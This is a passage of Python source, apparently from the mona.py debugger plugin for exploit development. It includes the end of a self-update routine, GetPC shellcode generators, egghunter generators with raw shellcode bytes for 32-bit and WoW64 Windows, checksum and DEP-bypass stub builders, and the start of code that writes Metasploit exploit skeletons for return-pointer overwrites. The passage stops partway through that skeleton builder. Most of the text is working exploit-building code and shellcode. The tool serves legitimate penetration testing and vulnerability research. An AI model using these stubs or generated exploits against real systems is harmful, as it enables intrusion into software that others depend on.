		dbg.log("    Download: version %s / revision %s" % (new_version, new_revision))
		dbgp("%s downloaded from %s" % (name, used_url))

		if force_update:
			if simulate_only:
				dbg.log("    [*] Simulation mode enabled - not updating %s (but -force would overwrite it)" % name)
				release_notes_targets.append((name, new_version, new_revision))
			else:
				try:
					dbgp("Force copying %s over %s" % (download_file, current_file))
					shutil.copyfile(download_file, current_file)
					dbg.log("    [+] Forced in-place update of %s" % name, highlight=1)
					release_notes_targets.append((name, new_version, new_revision))
				except Exception as e:
					dbg.log("    [-] Unable to force update %s" % name, highlight=1)
					dbg.log("        %s" % str(e))
					dbgp("Force copy failed for %s : %s" % (name, str(e)), errormode=False)
		elif _is_newer(current_version, current_revision, new_version, new_revision):
			dbg.log("    [+] Newer version found for %s" % name, highlight=1)

			if simulate_only:
				dbg.log("    [*] Simulation mode enabled - not updating %s" % name)
				dbgp("Simulation mode active, not copying %s on top of current file" % name)
				release_notes_targets.append((name, new_version, new_revision))
			else:
				try:
					dbgp("Copying %s over %s" % (download_file, current_file))
					shutil.copyfile(download_file, current_file)
					dbg.log("    [+] Updated %s in place" % name, highlight=1)
					release_notes_targets.append((name, new_version, new_revision))
				except Exception as e:
					dbg.log("    [-] Unable to update %s" % name, highlight=1)
					dbg.log("        %s" % str(e))
					dbgp("Copy failed for %s : %s" % (name, str(e)), errormode=False)
		else:
			dbg.log("    [+] You are already running the latest version of %s" % name)
			if simulate_only:
				dbgp("Simulation mode: using current version release notes for %s because no newer version was found" % name)
				release_notes_targets.append((name, current_version, current_revision))

		_safe_remove(download_file)

	if downloaded_release_notes and len(release_notes_targets) > 0:
		dbg.log("[+] Release notes")
		for fname, ver, rev in release_notes_targets:
			header, notes = _get_release_notes_with_retry(
				releasenotes_path,
				releasenotes_backup,
				fname,
				ver,
				rev
			)
			if header in seen_release_headers:
				dbgp("Skipping duplicate release notes header %s" % header)
				continue
			seen_release_headers[header] = True

			if notes != "":
				dbg.log("    %s" % header, highlight = True)
				for line in notes.splitlines():
					dbg.log("    %s" % line, highlight = True)
			else:
				dbgp("No release note entry found for %s, even after retrying backup server" % header)
	elif not downloaded_release_notes:
		dbgp("Release notes were not downloaded, so nothing will be shown")
	else:
		dbgp("No release notes targets were collected, so no release notes section will be printed")

	return "Done"



#----- GetPC -----#
def procgetPC(args):
	pc_targetreg = ""
	output = ""
	if "r" in args:
		if type(args["r"]).__name__.lower() != "bool":	
			pc_targetreg = args["r"].lower()
					
	if pc_targetreg == "" or not "r" in args:
		dbg.log("Missing argument -r <register>",highlight=1)
		return

	valid_regs_32 = [x.lower() for x in Registers32BitsOrder]
	valid_regs_64 = [x.lower() for x in Registers64BitsOrder]

	if pc_targetreg not in valid_regs_32 and pc_targetreg not in valid_regs_64:
		dbg.log("Invalid register '%s'." % pc_targetreg, highlight=1)
		dbg.log("Valid 32-bit registers: %s" % ", ".join(valid_regs_32))
		dbg.log("Valid 64-bit registers: %s" % ", ".join(valid_regs_64))
		return

	if arch == 32:
		opcodes = {}
		opcodes["eax"] = "\\x58"
		opcodes["ecx"] = "\\x59"
		opcodes["edx"] = "\\x5a"
		opcodes["ebx"] = "\\x5b"				
		opcodes["esp"] = "\\x5c"
		opcodes["ebp"] = "\\x5d"
		opcodes["esi"] = "\\x5e"
		opcodes["edi"] = "\\x5f"

		calls = {}
		calls["eax"] = "\\xd0"
		calls["ecx"] = "\\xd1"
		calls["edx"] = "\\xd2"
		calls["ebx"] = "\\xd3"				
		calls["esp"] = "\\xd4"
		calls["ebp"] = "\\xd5"
		calls["esi"] = "\\xd6"
		calls["edi"] = "\\xd7"
		
		output  = "\n" + pc_targetreg + "|  jmp short back:\n\"\\xeb\\x03" + opcodes[pc_targetreg] + "\\xff" + calls[pc_targetreg] + "\\xe8\\xf8\\xff\\xff\\xff\"\n"
		output += pc_targetreg + "|  call + 4:\n\"\\xe8\\xff\\xff\\xff\\xff\\xc3" + opcodes[pc_targetreg] + "\"\n"
		output += pc_targetreg + "|  fstenv:\n\"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4" + opcodes[pc_targetreg] + "\"\n"
	
	if arch == 64:
		output = ""
		asms = []
		# 7 bytes, but null bytes
		asms.append("lea %s, [7]" % pc_targetreg)
		# some variations
		asms.append("lea %s, [6]\nadd rax,5" % pc_targetreg)
		asms.append("lea %s, [5]\nadd rax,6" % pc_targetreg)
		asms.append("lea %s, [8]\nnop" % pc_targetreg)
		for asmstr in asms:
			assembled = dbg.assemble(asmstr)
			dbgp("[+] Assembled instruction '%s' into bytes: %s" % (asmstr.replace('\n',";"), bin2hex(assembled)))
			# join the bytes together
			bytelist = bin2hexstr(assembled)
			output += "\n" + pc_targetreg + "| %s: %s\n" % ( asmstr.replace('\n',';'), bytelist)


	getpcfilename="getpc.txt"
	objgetpcfile = MnLog(getpcfilename)
	getpcfile = objgetpcfile.reset(skipModuleTable=True)
	objgetpcfile.write(output,getpcfile)
	dbg.logLines(output)
	dbg.log("")			
	dbg.log("Wrote to file %s" % getpcfile)
	return		

	
#----- Egghunter -----#
def procEgg(args):
	filename = ""
	egg = b"w00t"
	usechecksum = False
	usewow64 = False
	useboth = False
	egg_size = 0
	win_ver = "10"
	win_vers = ["7","10","11"]
	checksumbyte = b""
	extratext = b""
	
	global silent
	oldsilent = silent
	silent = True			
	
	if "f" in args:
		if type(args["f"]).__name__.lower() != "bool":
			filename = args["f"]
	filename = getAbsolutePath(filename.replace("'", "").replace("\"", ""))

	if "winver" in args:
		if str(args["winver"]) in win_vers:
			win_ver = str(args["winver"])
		else:
			dbg.log("[-] Didn't recognize windows version, using Win10 as the default", highlight=True)
	#Set egg
	if "t" in args:
		if type(args["t"]).__name__.lower() != "bool":
			egg = _to_bytes(args["t"])

	if "wow64" in args:
		usewow64 = True


	# placeholder for later
	if "both" in args:
		useboth = True

	if len(egg) != 4:
		egg = b"w00t"
	dbg.log("[+] Egg set to %s" % _to_text(egg))
	
	if "c" in args:
		if filename != "":
			usechecksum = True
			dbg.log("[+] Hunter will include checksum routine")
		else:
			dbg.log("Option -c only works in conjunction with -f <filename>",highlight=1)
			return
	
	startreg = ""
	if "startreg" in args:
		if isReg(args["startreg"]):
			startreg = args["startreg"].lower()
			dbg.log("[+] Egg will start search at %s" % startreg)
	
			
	depmethods = ["virtualprotect","copy","copy_size"]
	depreg = "esi"
	depsize = 0
	freeregs = [ "ebx","ecx","ebp","esi" ]
	
	regsx = {}
	# 0 : mov xX
	# 1 : push xX
	# 2 : mov xL
	# 3 : mov xH
	#
	regsx["eax"] = [b"\x66\xb8",b"\x66\x50",b"\xb0",b"\xb4"]
	regsx["ebx"] = [b"\x66\xbb",b"\x66\x53",b"\xb3",b"\xb7"]
	regsx["ecx"] = [b"\x66\xb9",b"\x66\x51",b"\xb1",b"\xb5"]
	regsx["edx"] = [b"\x66\xba",b"\x66\x52",b"\xb2",b"\xb6"]
	regsx["esi"] = [b"\x66\xbe",b"\x66\x56"]
	regsx["edi"] = [b"\x66\xbf",b"\x66\x57"]
	regsx["ebp"] = [b"\x66\xbd",b"\x66\x55"]
	regsx["esp"] = [b"\x66\xbc",b"\x66\x54"]
	
	addreg = {}
	addreg["eax"] = b"\x83\xc0"
	addreg["ebx"] = b"\x83\xc3"			
	addreg["ecx"] = b"\x83\xc1"
	addreg["edx"] = b"\x83\xc2"
	addreg["esi"] = b"\x83\xc6"
	addreg["edi"] = b"\x83\xc7"
	addreg["ebp"] = b"\x83\xc5"			
	addreg["esp"] = b"\x83\xc4"
	
	depdest = ""
	depmethod = ""
	
	getpointer = ""
	getsize = b""
	getpc = b""
	
	jmppayload = b"\xff\xe7"	#jmp edi
	
	if "depmethod" in args:
		if args["depmethod"].lower() in depmethods:
			depmethod = args["depmethod"].lower()
			dbg.log("[+] Hunter will include routine to bypass DEP on found shellcode")
			# other DEP related arguments ?
			# depreg
			# depdest
			# depsize
		if "depreg" in args:
			if isReg(args["depreg"]):
				depreg = args["depreg"].lower()
		if "depdest" in args:
			if isReg(args["depdest"]):
				depdest = args["depdest"].lower()
		if "depsize" in args:
			try:
				depsize = int(args["depsize"])
			except:
				dbg.log(" ** Invalid depsize",highlight=1)
				return
	
	
	#read payload file
	data = b""
	if filename != "":
		filebytes = fileToBin(filename)
		if len(filebytes) == 0:
			try:
				if os.path.getsize(filename) > 0:
					dbg.log("Unable to read file %s" % filename, highlight=1)
					return
			except:
				dbg.log("Unable to read file %s" % filename, highlight=1)
				return
		data = _to_bytes(''.join(chr(b) for b in filebytes))
		dbg.log("[+] Read payload file (%d bytes)" % len(data))

			
	#let's start		
	egghunter = b""

	if not usewow64:
		#Basic version of egghunter
		dbg.log("[+] Generating traditional 32bit egghunter code")
		egghunter = b""
		egghunter += (
			b"\x66\x81\xca\xff\x0f"+	#or dx,0xfff
			b"\x42"+					#INC EDX
			b"\x52"					#push edx
			b"\x6a\x02"				#push 2	(NtAccessCheckAndAuditAlarm syscall)
			b"\x58"					#pop eax
			b"\xcd\x2e"				#int 0x2e 
			b"\x3c\x05"				#cmp al,5
			b"\x5a"					#pop edx
			b"\x74\xef"				#je "or dx,0xfff"
			b"\xb8"+egg+				#mov eax, egg
			b"\x8b\xfa"				#mov edi,edx
			b"\xaf"					#scasd
			b"\x75\xea"				#jne "inc edx"
			b"\xaf"					#scasd
			b"\x75\xe7"				#jne "inc edx"
		)
		incedxoffset = 5 # The offset in the egghunter to reach the #INC EDX
	if usewow64:
		dbg.log("[+] Generating egghunter for wow64, Windows %s" % win_ver)
		egghunter = b""
		if win_ver == "7":
			egghunter += (
				# 64 stub needed before loop
				b"\x31\xdb"                                      #xor ebx,ebx
				b"\x53"                                          #push ebx
				b"\x53"                                          #push ebx
				b"\x53"                                          #push ebx
				b"\x53"                                          #push ebx
				b"\xb3\xc0"                                      #mov bl,0xc0

				# 64 Loop
				b"\x66\x81\xCA\xFF\x0F"                          #OR DX,0FFF
				b"\x42"                                          #INC EDX
				b"\x52"                                          #PUSH EDX
				b"\x6A\x26"                                      #PUSH 26 
				b"\x58"                                          #POP EAX
				b"\x33\xC9"                                      #XOR ECX,ECX
				b"\x8B\xD4"                                      #MOV EDX,ESP
				b"\x64\xff\x13"                                  #CALL DWORD PTR FS:[ebx]
				b"\x5e"                                          #POP ESI
				b"\x5a"                                          #POP EDX
				b"\x3C\x05"                                      #CMP AL,5
				b"\x74\xe9"                                      #JE SHORT
				b"\xB8"+egg+                                     #MOV EAX,74303077 w00t
				b"\x8B\xFA"                                      #MOV EDI,EDX
				b"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
				b"\x75\xe4"                                      #JNZ "inc edx"
				b"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
				b"\x75\xe1"                                      #JNZ "inc edx"
				)
			incedxoffset = 13 # The offset in the egghunter to reach the #INC EDX
		elif win_ver == "10" or win_ver == "11":
			egghunter += (
			# _start:
				# "\x8c\xcb"            #MOV EBX,CS
				# "\x80\xfb\x23"        #CMP BL,0x23
				b"\x33\xD2"              #XOR EDX,EDX
			# invalid_page:
				b"\x66\x81\xCA\xFF\x0F"  #OR DX,0FFF
			# valid_page:
				b"\x33\xDB"              #XOR EBX,EBX
				b"\x42"               	#INC EDX
				b"\x53"               	#PUSH EBX
				b"\x53"               	#PUSH EBX
				b"\x52"               	#PUSH EDX
				b"\x53"               	#PUSH EBX
				b"\x53"               	#PUSH EBX
				b"\x53"               	#PUSH EBX
				b"\x6A\x29"            	#PUSH 29
				b"\x58"               	#POP EAX
				b"\xB3\xC0"            	#MOV BL,0C0
				b"\x64\xFF\x13"          #CALL DWORD PTR FS:[EBX]
				b"\x83\xC4\x0c"          #ADD ESP,0xc
				b"\x5A"               	#POP EDX
				b"\x83\xc4\x08"          #ADD ESP,0x8
				b"\x3C\x05"            	#CMP AL,5
				b"\x74\xDF"            	#JE SHORT invalid_page
				b"\xB8" + egg +  		#MOV EAX,<tag>
				b"\x8B\xFA"              #MOV EDI,EDX
				b"\xAF"               	#SCAS DWORD PTR ES:[EDI]
				b"\x75\xDA"            	#JNZ SHORT valid_page
				b"\xAF"              	#SCAS DWORD PTR ES:[EDI]
				b"\x75\xD7"    			#JNZ SHORT valid_page
				)
			incedxoffset = 9 # The offset in the egghunter to reach the #INC EDX
	if usechecksum:
		dbg.log("[+] Generating checksum routine")
		extratext = b"+ checksum routine"
		egg_size = b""
		if len(data) < 256:
			cmp_reg = b"\x80\xf9"	#cmp cl,value
			egg_size = _to_bytes(hex2bin("%02x" % len(data)))
			offset1 = b"\xf7"
		elif len(data) < 65536:
			cmp_reg = b"\x66\x81\xf9"	#cmp cx,value
			#avoid nulls
			egg_size_normal = "%04X" % len(data)
			while egg_size_normal[0:2] == "00" or egg_size_normal[2:4] == "00":
				data += b"\x90"
				egg_size_normal = "%04X" % len(data)
			egg_size = hex2bin(egg_size_normal[2:4]) + hex2bin(egg_size_normal[0:2])
			offset1 = b"\xf5"
		else:
			dbg.log("Cannot use checksum code with this payload size (way too big)",highlight=1)
			return
			
		sum = 0
		for byte in data:
			sum += _ord(byte)
		sumstr= toHex(sum)
		checksumbyte = sumstr[len(sumstr)-2:len(sumstr)]

		sizeOfjnzincedx = 2 # The number of bytes needed for the the jnz "inc edx" instruction below
		sizeOfChecksumRoutine = 15 # The number of static bytes in the checksum routine below
		offset2 = shortJump(sizeOfjnzincedx, - (len(egghunter) - incedxoffset + sizeOfChecksumRoutine + len(cmp_reg) + len(egg_size)))
		egghunter += (
			b"\x51"						#push ecx
			b"\x31\xc9"					#xor ecx,ecx
			b"\x31\xc0"					#xor eax,eax
			b"\x02\x04\x0f"				#add al,byte [edi+ecx]
			b"\x41"+						#inc ecx
			cmp_reg + egg_size +    	#cmp cx/cl, value
			b"\x75" + offset1 +			#jnz "add al,byte [edi+ecx]
			b"\x3a\x04\x39" +			#cmp al,byte [edi+ecx]
			b"\x59" +					#pop ecx
			b"\x75" + offset2			#jnz "inc edx"
		)		

	#dep bypass ?
	if depmethod != "":
		dbg.log("[+] Generating dep bypass routine")
	
		if not depreg in freeregs:
			getpointer += "mov " + freeregs[0] +"," + depreg + "#"
			depreg = freeregs[0]
		
		freeregs.remove(depreg)
		if depmethod == "copy" or depmethod == "copy_size":
			if depdest != "":
				if not depdest in freeregs:
					getpointer += "mov " + freeregs[0] + "," + depdest + "#"
					depdest = freeregs[0]
			else:
				getpc = b"\xd9\xee"			# fldz
				getpc += b"\xd9\x74\xe4\xf4"	# fstenv [esp-0c]
				depdest = freeregs[0]
				getpc += hex2bin(assemble("pop "+depdest))
			
			freeregs.remove(depdest)
		
		sizereg = freeregs[0]
		
		if depsize == 0:
			# set depsize to payload * 2 if we are using a file
			depsize = len(data) * 2
			if depmethod == "copy_size":
				depsize = len(data)
			
		if depsize == 0:
			dbg.log("** Please specify a valid -depsize when you are not using -f **",highlight=1)
			return
		else:
			if depsize <= 127:
				#simply push it to the stack
				getsize = b"\x6a" + hex2bin("\\x" + toHexByte(depsize))
			else:
				#can we do it with 16bit reg, no nulls ?
				if depsize <= 65535:
					sizeparam = toHex(depsize)[4:8]
					getsize = hex2bin(assemble("xor "+sizereg+","+sizereg))
					if not (sizeparam[0:2] == "00" or sizeparam[2:4] == "00"):
						#no nulls, hooray, write to xX
						getsize += regsx[sizereg][0]+hex2bin("\\x" + sizeparam[2:4] + "\\x" + sizeparam[0:2])
					else:
						# write the non null if we can
						if len(regsx[sizereg]) > 2:
							if not (sizeparam[0:2] == "00"):
								# write to xH
								getsize += regsx[sizereg][3] + hex2bin("\\x" + sizeparam[0:2])
							if not (sizeparam[2:4] == "00"):
								# write to xL
								getsize += regsx[sizereg][2] + hex2bin("\\x" + sizeparam[2:4])
						else:
							#we have to write the full value to sizereg
							blockcnt = 0
							vpsize = 0
							blocksize = depsize
							while blocksize >= 127:
								blocksize = blocksize // 2
								blockcnt += 1
							if blockcnt > 0:
								getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(blocksize))
								vpsize = blocksize
								depblockcnt = 0
								while depblockcnt < blockcnt:
									getsize += hex2bin(assemble("add "+sizereg+","+sizereg))
									vpsize += vpsize
									depblockcnt += 1
								delta = depsize - vpsize
								if delta > 0:
									getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(delta))
							else:
								getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(depsize))
						# finally push
					getsize += hex2bin(assemble("push "+ sizereg))
						
				else:
					dbg.log("** Shellcode size (depsize) is too big",highlight=1)
					return
				
		#finish it off
		if depmethod == "virtualprotect":
			jmppayload = b"\x54\x6a\x40"
			jmppayload += getsize
			jmppayload += _to_bytes(hex2bin(assemble("#push edi#push edi#push "+depreg+"#ret")))
		elif depmethod == "copy":
			jmppayload = _to_bytes(hex2bin(assemble("push edi\push "+depdest+"#push "+depdest+"#push "+depreg+"#mov edi,"+depdest+"#ret")))
		elif depmethod == "copy_size":
			jmppayload += getsize
			jmppayload += _to_bytes(hex2bin(assemble("push edi#push "+depdest+"#push " + depdest + "#push "+depreg+"#mov edi,"+depdest+"#ret")))
		

	#jmp to payload
	egghunter += getpc
	egghunter += jmppayload
	
	startat = b""
	skip = b""
	
	#start at a certain reg ?
	if startreg != "":
		if startreg != "edx":
			startat = hex2bin(assemble("mov edx," + startreg))
		skip = b"\xeb\x05"
	
	egghunter = skip + egghunter
	#pickup pointer for DEP bypass ?
	egghunter = hex2bin(assemble(getpointer)) + egghunter
	
	egghunter = startat + egghunter
	
	silent = oldsilent			
	
	#Convert binary to printable hex format
	egghunter_hex = toniceHex(egghunter.strip().replace(b" ",b""),16)
			
	hunterfilename="egghunter.txt"
	objegghunterfile = MnLog(hunterfilename)
	egghunterfile = objegghunterfile.reset(skipModuleTable=True)						

	dbg.log("[+] Egghunter %s (%d bytes): " % (_to_text(extratext), len(egghunter.strip().replace(b" ", b""))))
	dbg.logLines("%s" % egghunter_hex)

	objegghunterfile.write("Egghunter " + _to_text(extratext) + ", tag " + _to_text(egg) + " : ",egghunterfile)
	objegghunterfile.write(egghunter_hex,egghunterfile)			

	if filename == "":
		objegghunterfile.write("Put this tag in front of your shellcode : " + _to_text(egg) + _to_text(egg),egghunterfile)
	else:
		dbg.log("[+] Shellcode, with tag : ")			
		block = "\"" + egg + egg + "\"\n"
		cnt = 0
		flip = 1
		thisline = "\""
		while cnt < len(data):
			thisline += "\\x%s" % toHexByte(_ord(data[cnt]))				
			if (flip == 32) or (cnt == len(data)-1):
				if cnt == len(data)-1 and checksumbyte != "":
					thisline += "\\x%s" % checksumbyte					
				thisline += "\""
				flip = 0
				block += thisline 
				block += "\n"
				thisline = "\""
			cnt += 1
			flip += 1
		dbg.logLines(block)	
		objegghunterfile.write("\nShellcode, with tag :\n",egghunterfile)
		objegghunterfile.write(block,egghunterfile)	
			
	return

#----- Find MSP ------ #

def procFindMSP(args):
	distance = 0
	
	if "distance" in args:
		try:
			distance = int(args["distance"])
		except:
			distance = 0
	if distance < 0:
		dbg.log("** Please provide a positive number as distance",highlight=1)
		return
	mspresults = {}
	mspresults = goFindMSP(distance,args)
	return
	
def procSuggest(args):
	modulecriteria={}
	criteria={}
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	isEIP = False
	isSEH = False
	isEIPUnicode = False
	isSEHUnicode = False
	initialoffsetSEH = 0
	initialoffsetEIP = 0
	shellcodesizeSEH = 0
	shellcodesizeEIP = 0
	nullsallowed = True
	
	global noheader
	global ptr_to_get
	global silent
	global ptr_counter
	
	targetstr = ""
	exploitstr = ""
	originalauthor = ""
	url = ""
	
	#are we attached to an application ?
	if dbg.getDebuggedPid() == 0:
		dbg.log("** You don't seem to be attached to an application ! **",highlight=1)
		return

	exploittype = ""
	skeletonarg = ""
	usecliargs = False
	validstypes ={}
	validstypes["tcpclient"] = "network client (tcp)"
	validstypes["udpclient"] = "network client (udp)"
	validstypes["fileformat"] = "fileformat"
	exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
	if __DEBUGGERAPP__ == "WinDBG" or "t" in args:
		if "t" in args:
			if type(args["t"]).__name__.lower() != "bool":
				skeltype = args["t"].lower()
				skelparts = skeltype.split(":")
				if skelparts[0] in validstypes:
					exploittype = validstypes[skelparts[0]]
					if len(skelparts) > 1:
						skeletonarg = skelparts[1]
					else:
						dbg.log(" ** Please specify the skeleton type AND an argument. **")
						return
					usecliargs = True
				else:
					dbg.log(" ** Please specify a valid skeleton type and an argument. **")
					return							
			else:
				dbg.log(" ** Please specify a skeletontype using -t **",highlight=1)
				return
		else:
			dbg.log(" ** Please specify a skeletontype using -t **",highlight=1)
			return

	mspresults = {}
	mspresults = goFindMSP(100,args)

	#create metasploit skeleton file
	exploitfilename="exploit.rb"
	objexploitfile = MnLog(exploitfilename)

	#ptr_to_get = 5				
	noheader = True
	exploitfile = objexploitfile.reset(showheader = False, skipModuleTable=True)			
	noheader = False
	
	dbg.log(" ")
	dbg.log("[+] Preparing payload...")
	dbg.log(" ")			
	dbg.updateLog()
	#what options do we have ?
	# 0 : pointer
	# 1 : offset
	# 2 : type
	
	if "registers" in mspresults:
		for reg in mspresults["registers"]:
			if reg.lower() == "eip" or reg.lower() == "rip":
				isEIP = True
				eipval = mspresults["registers"][reg][0]
				ptrx = MnPointer(eipval)
				initialoffsetEIP = mspresults["registers"][reg][1]
				
	# 0 : pointer
	# 1 : offset
	# 2 : type
	# 3 : size
	if "seh" in mspresults:
		if len(mspresults["seh"]) > 0:
			isSEH = True
			for seh in mspresults["seh"]:
				if mspresults["seh"][seh][2] == "unicode":
					isSEHUnicode = True
				if not isSEHUnicode:
					initialoffsetSEH = mspresults["seh"][seh][1]
				else:
					initialoffsetSEH = mspresults["seh"][seh][1]
				shellcodesizeSEH = mspresults["seh"][seh][3]
				
	if isSEH:
		noheader = True
		exploitfilename_seh="exploit_seh.rb"
		objexploitfile_seh = MnLog(exploitfilename_seh)
		exploitfile_seh = objexploitfile_seh.reset(showheader=False,skipModuleTable=True)				
		noheader = False

	# start building exploit structure
	
	if not isEIP and not isSEH:
		dbg.log(" ** Unable to suggest anything useful. You don't seem to control %s or SEH ** " % PROGRAM_COUNTER,highlight=1)
		return

	# ask for type of module
	if not usecliargs:
		dbg.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
		exploittype = dbg.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()

	if not exploittype in exploittypes:
		dbg.log("Boo - invalid exploit type, try again !",highlight=1)
		return


	portnr = 0
	extension = ""
	if exploittype.find("network") > -1:
		if usecliargs:
			portnr = skeletonarg
		else:
			portnr = dbg.inputBox("Remote port number : ")
		try:
			portnr = int(portnr)
		except:
			portnr = 0

	if exploittype.find("fileformat") > -1:
		if usecliargs:
			extension = skeletonarg
		else:
			extension = dbg.inputBox("File extension :")
	
	extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
	
	if not extension.startswith("."):
		extension = "." + extension	
		
		
	dbg.createLogWindow()
	dbg.updateLog()
	url = ""
	
	badchars = ""
	if "badchars" in criteria:
		badchars = criteria["badchars"]
		
	if "nonull" in criteria:
		if not '\x00' in badchars:
			badchars += '\x00'
	
	skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,url,badchars)
	
	regsto = ""			

	if isEIP:
		dbg.log("[+] Attempting to create payload for saved return pointer overwrite...")
		#where can we jump to - get the register that has the largest buffer size
		largestreg = ""
		largestsize = 0
		offsetreg = 0
		regptr = 0
		# register_to
		# 0 : pointer
		# 1 : offset
		# 2 : size
		# 3 : type
		eipcriteria = criteria
		modulecriteria["aslr"] = False
		modulecriteria["rebase"] = False
		modulecriteria["os"] = False
		jmp_pointers = {}
		jmppointer = 0
		instrinfo = ""

		if isEIPUnicode:
			eipcriteria["unicode"] = True
			eipcriteria["nonull"] = False
			
		if "registers_to" in mspresults:
			for reg in mspresults["registers_to"]:
				regsto += reg+","
				thissize = mspresults["registers_to"][reg][2]
				thisreg = reg
				thisoffset = mspresults["registers_to"][reg][1]
				thisregptr = mspresults["registers_to"][reg][0]
				if thisoffset < initialoffsetEIP:
					#fix the size, which will end at offset to EIP
					thissize = initialoffsetEIP - thisoffset
				if thissize > largestsize:								
					# can we find a jmp to that reg ?
					silent = True
					ptr_counter = 0
					ptr_to_get = 1								
					jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
					if len( jmp_pointers ) == 0:
						ptr_counter = 0
						ptr_to_get = 1								
						modulecriteria["os"] = True
						jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
					modulecriteria["os"] = False
					if len( jmp_pointers ) > 0:
						largestsize = thissize 
						largestreg = thisreg
						offsetreg = thisoffset
						regptr = thisregptr
					silent = False
		regsto = regsto.rstrip(",")
		
		
		if largestreg == "":
			dbg.log("    Payload is referenced by at least one register (%s), but I couldn't seem to find" % regsto,highlight=1)
			dbg.log("    a way to jump to that register",highlight=1)
		else:
			#build exploit
			for ptrtype in jmp_pointers:
				jmppointer = jmp_pointers[ptrtype][0]
				instrinfo = ptrtype
				break
			ptrx = MnPointer(jmppointer)
			modname = ptrx.belongsTo()
			targetstr = "      'Targets'    =>\n"
			targetstr += "        [\n"
			targetstr += "          [ '<fill in the OS/app version here>',\n"
			targetstr += "            {\n"
			if not isEIPUnicode:
				targetstr += "              'Ret'     =>  0x" + toHex(jmppointer) + ", # " + instrinfo + " - " + modname + "\n"
				targetstr += "              'Offset'  =>  " + str(initialoffsetEIP) + "\n"
			else:
				origptr = toHex(jmppointer)
				#real unicode ?
				unicodeptr = ""
				transforminfo = ""
				if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":					
					unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
				else:
					#transform
					transform = UnicodeTransformInfo(origptr)
					transformparts = transform.split(",")
					transformsubparts = transformparts[0].split(" ")
					origptr = transformsubparts[len(transformsubparts)-1]
					transforminfo = " #unicode transformed to 0x" + toHex(jmppointer)
					unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
				targetstr += "              'Ret'     =>  " + unicodeptr + "," + transforminfo + "# " + instrinfo + " - " + modname + "\n"
				targetstr += "              'Offset'  =>  " + str(initialoffsetEIP) + "  #Unicode\n"	
			
			targetstr += "            }\n"
			targetstr += "          ],\n"
			targetstr += "        ],\n"

			exploitstr = "  def exploit\n\n"
			if exploittype.find("network") > -1:
				if exploittype.find("tcp") > -1:
					exploitstr += "\n    connect\n\n"
				elif exploittype.find("udp") > -1:
					exploitstr += "\n    connect_udp\n\n"
			
			if initialoffsetEIP < offsetreg:
				# eip is before shellcode
				exploitstr += "    buffer =  rand_text(target['Offset'])  \n"
				if not isEIPUnicode:
					if arch == 32:
						exploitstr += "    buffer << [target.ret].pack('V')  \n"
					if arch == 64:
						exploitstr += "    buffer << [target.ret].pack('Q<')  \n"
				else:
					exploitstr += "    buffer << target['Ret']  #Unicode friendly jump\n\n"
				if offsetreg > initialoffsetEIP+2:
					if not isEIPUnicode:
						if (offsetreg - initialoffsetEIP - 4) > 0:
							exploitstr += "    buffer << rand_text(" + str(offsetreg - initialoffsetEIP - 4) + ")  #junk\n"
					else:
						if ((offsetreg - initialoffsetEIP - 4)/2) > 0:
							exploitstr += "    buffer << rand_text(" + str((offsetreg - initialoffsetEIP - 4)/2) + ")  #unicode junk\n"
				stackadjust = 0
				if largestreg.lower() == "esp":
					if not isEIPUnicode:
						exploitstr += "    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption\n"
						stackadjust = 6
						exploitstr += "    buffer << payload.encoded  #max " + str(largestsize - stackadjust) + " bytes\n"
				if isEIPUnicode:
					exploitstr += "    # Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
					exploitstr += "    # and then manually encode with unicode inside the exploit section :\n\n"
					exploitstr += "    enc = framework.encoders.create('x86/unicode_mixed')\n\n"
					exploitstr += "    register_to_align_to = '" + largestreg.upper() + "'\n\n"
					if largestreg.lower() == "esp":
						exploitstr += "    # Note : since you are using ESP as bufferregister, make sure EBP points to a writeable address !\n"
						exploitstr += "    # or patch the unicode decoder yourself\n"
					exploitstr += "    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
					exploitstr += "    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
					exploitstr += "    buffer << unicodepayload"
						
			else:
				# EIP -> jump to location before EIP
				beforeEIP = initialoffsetEIP - offsetreg
				if beforeEIP > 0:
					if offsetreg > 0:
						exploitstr += "    buffer = rand_text(" + str(offsetreg)+")  #offset to " + largestreg+"\n"
						exploitstr += "    buffer << payload.encoded  #max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
						exploitstr += "    buffer << rand_text(target['Offset'] - payload.encoded.length)\n"
						exploitstr += "    buffer << [target.ret].pack('V')  \n"
					else:
						exploitstr += "    buffer = payload.encoded  #max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
						exploitstr += "    buffer << rand_text(target['Offset'] - payload.encoded.length)\n"
						exploitstr += "    buffer << [target.ret].pack('V')  \n"

			if exploittype.find("network") > -1:
				exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"
				if exploittype.find("tcp") > -1:
					exploitstr += "    sock.put(buffer)\n"
					exploitstr += "\n    handler\n"
				elif exploittype.find("udp") > -1:
					exploitstr += "    udp_sock.put(buffer)\n"
					exploitstr += "\n    handler(udp_sock)\n"
			if exploittype == "fileformat":
				exploitstr += "\n    file_create(buffer)\n\n"
			
			if exploittype.find("network") > -1:
				exploitstr += "    disconnect\n\n"
			exploitstr += "  end\n"					
			dbg.log("Metasploit 'Targets' section :")
